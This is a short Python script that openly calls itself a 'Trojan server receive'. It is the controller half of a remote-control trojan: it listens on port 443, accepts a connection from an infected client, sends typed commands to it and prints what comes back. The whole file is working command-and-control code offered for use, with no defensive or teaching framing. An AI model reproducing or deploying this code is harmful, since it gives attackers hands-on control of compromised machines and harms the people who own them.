import socket
import sys

PORT = 443
DATA = None


def connect():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server.bind(("127.0.0.1", PORT))
    server.listen()
    print("Listening...")
    client, clientAddress = server.accept()
    print(">>> Connected to: {}".format(clientAddress))

    while True:
        global DATA
        DATA = input(">>> ")

        if DATA == "exit":
            client.send(b"/exit")
            sys.exit()
        elif len(DATA) <= 0 or DATA.isspace():
            print("Nothing Here")
        else:
            client.send(DATA.encode())
            dataFromClient = client.recv(1024).decode()
            print(dataFromClient)
        DATA = None


if __name__ == "__main__":
    try:
        print(">>> Hello, Welcome to Trojan server receive")
        print(">>> Edit the Global variables to receive connections in correct PORT ---> DEFAULT IS: 443")
        print(">>> Enjoy")
        init = input("\n>>> Start Server ? Y/N <<<\n")
        if init == "Y" or init == "y":
            connect()
        else:
            print("<<<<< Thank You ! >>>>>")
    except Exception as e:
        print(e)